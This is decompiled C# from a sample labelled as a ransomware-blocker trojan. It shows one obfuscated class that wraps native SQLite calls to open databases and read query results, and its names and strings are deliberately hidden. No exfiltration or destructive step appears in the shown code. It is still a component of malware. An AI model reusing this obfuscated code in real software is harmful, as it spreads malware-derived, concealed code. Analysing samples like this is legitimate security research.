// Decompiled with JetBrains decompiler
// Type: 
// Assembly: winlogon, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 92BE594B-097B-419F-BA52-678600CDFEA7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-e01416f400ce0b70a479fa73ab196195d540bcba32457839183e434f958fa820.exe

using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

public sealed class \u000E
{
  private IntPtr \u0002;

  public \u000E() => this.\u0002 = IntPtr.Zero;

  public \u000E(string _param1) => this.\u0002(_param1);

  [DllImport("kernel32")]
  private static extern IntPtr HeapAlloc(IntPtr _param0, uint _param1, uint _param2);

  [DllImport("kernel32")]
  private static extern IntPtr GetProcessHeap();

  [DllImport("kernel32")]
  private static extern int lstrlen(IntPtr _param0);

  [DllImport("sqlite3")]
  private static extern int sqlite3_open(IntPtr _param0, ref IntPtr _param1);

  [DllImport("sqlite3")]
  private static extern int sqlite3_close(IntPtr _param0);

  [DllImport("sqlite3")]
  private static extern int sqlite3_exec(
    IntPtr _param0,
    IntPtr _param1,
    IntPtr _param2,
    IntPtr _param3,
    ref IntPtr _param4);

  [DllImport("sqlite3")]
  private static extern IntPtr sqlite3_errmsg(IntPtr _param0);

  [DllImport("sqlite3")]
  private static extern int sqlite3_prepare_v2(
    IntPtr _param0,
    IntPtr _param1,
    int _param2,
    ref IntPtr _param3,
    ref IntPtr _param4);

  [DllImport("sqlite3")]
  private static extern int sqlite3_step(IntPtr _param0);

  [DllImport("sqlite3")]
  private static extern int sqlite3_column_count(IntPtr _param0);

  [DllImport("sqlite3")]
  private static extern IntPtr sqlite3_column_name(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern int sqlite3_column_type(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern int sqlite3_column_int(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern double sqlite3_column_double(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern IntPtr sqlite3_column_text(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern IntPtr sqlite3_column_blob(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern IntPtr sqlite3_column_table_name(IntPtr _param0, int _param1);

  [DllImport("sqlite3")]
  private static extern int sqlite3_finalize(IntPtr _param0);

  public void \u0002(string _param1)
  {
    if (\u000E.sqlite3_open(this.\u0002(_param1), ref this.\u0002) != 0)
    {
      this.\u0002 = IntPtr.Zero;
      throw new Exception(\u0003\u2000.\u0002(72093164) + _param1 + \u0003\u2000.\u0002(72110618));
    }
  }

  public void \u0002()
  {
    if (!(this.\u0002 != IntPtr.Zero))
      return;
    \u000E.sqlite3_close(this.\u0002);
  }

  public ArrayList \u0002()
  {
    DataTable dataTable = this.\u0002(\u0003\u2000.\u0002(72093129));
    ArrayList arrayList = new ArrayList();
    try
    {
      foreach (DataRow row in dataTable.Rows)
        arrayList.Add((object) row.ItemArray[0].ToString());
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    return arrayList;
  }

  public void \u0003(string _param1)
  {
    IntPtr num;
    \u000E.sqlite3_exec(this.\u0002, this.\u0002(_param1), IntPtr.Zero, IntPtr.Zero, ref num);
    if (num != IntPtr.Zero)
      throw new Exception(\u0003\u2000.\u0002(72092817) + _param1 + \u0003\u2000.\u0002(72092905) + this.\u0002(\u000E.sqlite3_errmsg(num)));
  }

  public DataTable \u0002(string _param1)
  {
    IntPtr num1;
    IntPtr num2;
    \u000E.sqlite3_prepare_v2(this.\u0002, this.\u0002(_param1), this.\u0002(this.\u0002(_param1)), ref num1, ref num2);
    DataTable dataTable = new DataTable();
    int num3 = this.\u0002(num1, ref dataTable);
    while (num3 == 100)
      num3 = this.\u0003(num1, ref dataTable);
    \u000E.sqlite3_finalize(num1);
    return dataTable;
  }

  private int \u0002(IntPtr _param1, ref DataTable _param2)
  {
    _param2 = new DataTable(\u0003\u2000.\u0002(72092899));
    if (\u000E.sqlite3_step(_param1) == 100)
    {
      int num1 = \u000E.sqlite3_column_count(_param1);
      string empty = string.Empty;
      object[] objArray = new object[checked (num1 - 1 + 1)];
      int num2 = checked (num1 - 1);
      int index = 0;
      while (index <= num2)
      {
        string columnName = this.\u0002(\u000E.sqlite3_column_name(_param1, index));
        switch (\u000E.sqlite3_column_type(_param1, index))
        {
          case 1:
            _param2.Columns.Add(columnName, Type.GetType(\u0003\u2000.\u0002(72092877)));
            objArray[index] = (object) \u000E.sqlite3_column_int(_param1, index);
            break;
          case 2:
            _param2.Columns.Add(columnName, Type.GetType(\u0003\u2000.\u0002(72092478)));
            objArray[index] = (object) \u000E.sqlite3_column_double(_param1, index);
            break;
          case 3:
            _param2.Columns.Add(columnName, Type.GetType(\u0003\u2000.\u0002(72092458)));
            objArray[index] = (object) this.\u0002(\u000E.sqlite3_column_text(_param1, index));
            break;
          case 4:
            _param2.Columns.Add(columnName, Type.GetType(\u0003\u2000.\u0002(72092458)));
            objArray[index] = (object) this.\u0002(\u000E.sqlite3_column_blob(_param1, index));
            break;
          default:
            _param2.Columns.Add(columnName, Type.GetType(\u0003\u2000.\u0002(72092458)));
            objArray[index] = (object) string.Empty;
            break;
        }
        checked { ++index; }
      }
      _param2.Rows.Add(objArray);
    }
    return \u000E.sqlite3_step(_param1);
  }

  private int \u0003(IntPtr _param1, ref DataTable _param2)
  {
    int num1 = \u000E.sqlite3_column_count(_param1);
    object[] objArray = new object[checked (num1 - 1 + 1)];
    int num2 = checked (num1 - 1);
    int index = 0;
    while (index <= num2)
    {
      switch (\u000E.sqlite3_column_type(_param1, index))
      {
        case 1:
          objArray[index] = (object) \u000E.sqlite3_column_int(_param1, index);
          break;
        case 2:
          objArray[index] = (object) \u000E.sqlite3_column_double(_param1, index);
          break;
        case 3:
          objArray[index] = (object) this.\u0002(\u000E.sqlite3_column_text(_param1, index));
          break;
        case 4:
          objArray[index] = (object) this.\u0002(\u000E.sqlite3_column_blob(_param1, index));
          break;
        default:
          objArray[index] = (object) string.Empty;
          break;
      }
      checked { ++index; }
    }
    _param2.Rows.Add(objArray);
    return \u000E.sqlite3_step(_param1);
  }

  private IntPtr \u0002(string _param1)
  {
    if (_param1 == null)
      return IntPtr.Zero;
    byte[] bytes = Encoding.UTF8.GetBytes(_param1);
    uint num1 = checked ((uint) (bytes.Length + 1));
    IntPtr num2 = \u000E.HeapAlloc(\u000E.GetProcessHeap(), 0U, num1);
    Marshal.Copy(bytes, 0, num2, bytes.Length);
    Marshal.WriteByte(num2, bytes.Length, (byte) 0);
    return num2;
  }

  private string \u0002(IntPtr _param1)
  {
    if (_param1 == IntPtr.Zero)
      return (string) null;
    Encoding utF8 = Encoding.UTF8;
    int num = this.\u0002(_param1);
    byte[] numArray = new byte[checked (num - 1 + 1)];
    Marshal.Copy(_param1, numArray, 0, num);
    return utF8.GetString(numArray, 0, num);
  }

  private int \u0002(IntPtr _param1) => _param1 == IntPtr.Zero ? 0 : \u000E.lstrlen(_param1);

  public enum \u0002
  {
  }
}
